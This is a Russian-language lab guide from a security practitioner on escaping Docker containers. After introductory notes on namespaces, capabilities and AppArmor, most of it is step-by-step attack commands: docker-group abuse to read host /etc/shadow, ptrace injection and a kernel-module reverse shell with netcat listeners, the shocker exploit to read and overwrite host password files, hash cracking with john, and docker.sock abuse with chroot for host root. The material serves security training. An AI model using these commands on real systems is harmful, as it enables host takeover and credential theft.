Привет, я Алексей Федулаев. Руководитель направления Cloud Native Security MTS Web Services

Веду канал  [Ever Secure](https://t.me/ever_secure)

# Docker Escape
 Создаем ВМ

install docker
https://docs.docker.com/engine/install/ubuntu/

> sudo docker version

> sudo usermod -aG docker ${USER}

> docker version



## Узнаем про изоляцию docker 
> ls -l /proc/$$/ns

(текущий процесс $$) `/proc/$$/ns`: Это путь к каталогу, который содержит информацию о пространстве имен (namespaces) текущего процесса. $$ заменяется на PID текущего процесса, что позволяет получить доступ к пространствам имен, связанным с этим процессом.

> docker run -d --rm --name mynginx nginx

> docker exec -it mynginx bash

> ls -l /proc/$$/ns

> apt update

> apt install -y procps

> docker inspect -f '{{ .State.Pid }}' mynginx

Разбор команды:
1. docker inspect: Это команда, которая позволяет получить низкоуровневую информацию о различных объектах Docker, таких как контейнеры, образы, сети и тома. По умолчанию выводится информация в формате JSON, содержащая множество деталей о запрашиваемом объекте.
2. -f '{{ .State.Pid }}': Этот параметр -f (или --format) указывает Docker отформатировать вывод с использованием шаблона Go. В данном случае шаблон '{{ .State.Pid }}' извлекает только идентификатор процесса (PID) контейнера из его состояния. Это позволяет получить конкретную информацию без необходимости просматривать весь JSON-вывод.

#### сравниваем выдачу ps aux

> ps -aux | grep PID

# Сначала узнаем про capability и Apparmor

Капабилити (capabilities) в контексте Linux и пакета **libcap2-bin** представляют собой механизм, который позволяет разделить привилегии суперпользователя (root) на более мелкие, управляемые права. Это позволяет повысить безопасность системы, позволяя процессам выполнять определенные действия без необходимости предоставления полного доступа к правам суперпользователя.

> apt install libcap2-bin

libcap2-bin: Это пакет в Linux, который предоставляет пользовательские интерфейсы для работы с капабилити. Он включает утилиты для управления капабилити процессов, такие как **setcap** и **getcap**, которые позволяют устанавливать и получать капабилити для файлов и процессов. 

> capsh --print

При помощи таких команд, можно сбежать: **cap_sys_admin**, **cap_dac_read_search**, **cap_sys_ptrace**

> docker commit mynginx mynginx

Создание нового образа: Команда docker commit позволяет сохранить текущее состояние контейнера в виде нового Docker-образа. Это полезно, если вы внесли изменения в контейнер, такие как установка новых пакетов или изменение конфигураций.

> docker images

> docker stop mynginx

#### Запустим контейнер 

> docker run -d --rm --name mynginx -p 80:80  mynginx

> docker exec -it mynginx bash

> capsh --print

> docker run -d --rm --name privnginx -p 8080:80 --privileged=true mynginx

> docker exec -it privnginx bash

> capsh --print

> docker run -d --rm --name dropnginx -p 9000:80 --cap-drop=ALL mynginx

> docker exec -it dropnginx bash

> capsh --print

# Узнаем про Apparmor

AppArmor — это система управления доступом, используемая в Linux для ограничения возможностей программ, основываясь на профилях безопасности. Она позволяет администраторам определять, какие ресурсы могут использовать приложения и какие действия они могут выполнять, что повышает безопасность системы.

> docker ps --quiet --all | xargs docker inspect --format '{{ .Name }}: AppArmorProfile={{ .AppArmorProfile }}'

> docker stop mynginx privnginx dropnginx

# Делаем образ с capsh
> docker run -it --rm --name myubuntu ubuntu

> apt update

> apt install -y libcap2-bin vim gcc net-tools netcat-traditional john ssh

> capsh --print

> docker commit myubuntu myubuntu

## CAP SYS_ADMIN
> docker run -it --cap-drop=ALL --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --device=/dev/:/ myubuntu bash

> caps --print

> ^D

> sudo useradd unpriv

> sudo useradd admin

> sudo passwd unpriv

> sudo passwd admin

> sudo usermod -aG docker unpriv

> su unpriv

> sudo -v

> groups

> docker run -it --rm -v /:/host myubuntu bash

> grep admin /host/etc/shadow

> sudo usermod -G "" meltdown

> ^D

> groups

> sudo install -m=xs $(which docker) .

> ./docker run -it --rm -v /:/host myubuntu

> grep admin /host/etc/shadow

> ^D

> grep admin /etc/shadow

> sudo usermod -aG docker ${USER}

> ^D

> ssh



## CAP SYS_PTRACE  + shared pid NS
на хосте
> /usr/bin/python3 -m http.server 8080

> docker run -it --rm --pid=host --cap-add=SYS_PTRACE --security-opt apparmor=unconfined myubuntu bash

> ps -eaf | grep "/usr/bin/python3 -m http.server 8080" | head -n 1

> vim inject.c

> gcc -o inject inject.c

> ./inject <PID>

> nc 192.168.1.12 5600

> whoami

> sudo -i

> docker ps

## CAP SYS_MODULE
> lsb_release -a

> docker run -it --cap-add=SYS_MODULE ubuntu:20.04 bash

> apt update

> version=$(uname -r)

> apt install -y make vim netcat gcc linux-headers-$version kmod net-tools

> vim Makefile

> vim reverse-shell.c

change IP!!! container IP

> make

> nc -lnvp 4444 & /usr/sbin/insmod reverse-shell.ko

может понадобится несколько попыток, для выгрузки используйте 

> rmmod reverse-shell.ko

## CAP DAC_READ_SEARCH
на локальной машине
> sudo passwd root

> docker run -it --cap-add=DAC_READ_SEARCH myubuntu bash

> apt install -y vim ssh gcc john net-tools netcat

> vim shocker.c

> gcc -o shocker shocker.c

> ./shocker /etc/passwd passwd

> ./shocker /etc/shadow shadow

> unshadow passwd shadow > password

> john password --format=crypt

## CAP SYS_ADMIN DAC_OVERRIDE
> docker run -it --cap-add=DAC_READ_SEARCH --cap-add=DAC_OVERRIDE myubuntu bash
#### Copy and paste the shocker.c content
> vim shocker.c

> gcc -o read shocker.c
#### Copy and paste the shocker_write.c content
> vim shocker_write.c

> gcc -o write shocker_write.c
#### Use the ./read to read files from host: ./read /host/path /container/path
> ./read /etc/shadow shadow

> ./read /etc/passwd passwd
#### Create new user and reset its password
> useradd <USER-NAME>

> echo '<USER-NAME>:<PASSWORD>' | chpasswd 
#### Update the new user details in the copied files from host
> tail -1 /etc/passwd >> passwd

> tail -1 /etc/shadow >> shadow
#### Copy the new user password hash paste it also for the root user in the shadow file. This will allow us to elevate permissions on the host.
> vim shadow
#### Use the ./write to write files from host: ./write /host/path /container/path
> ./write /etc/passwd passwd

> ./write /etc/shadow shadow
#### Connect to host over ssh using the new user (unprivileged)
> ssh privet@192.168.1.12
#### Elevate privileges to root user with the new password
> su

## CAP NO_CAP!!!
> docker run -it -v /var/run/docker.sock:/run/docker.sock docker:dind /bin/sh

> docker run -it --privileged -v /:/host/ ubuntu bash -c "chroot /host/"

теперь можем выполнять любые команды от имени root на хостовой машине

> useradd newuser

> passwd newuser

добавляем нового юзера в sudoers
...
ssh newuser@hostname
sudo -i
PROFIT

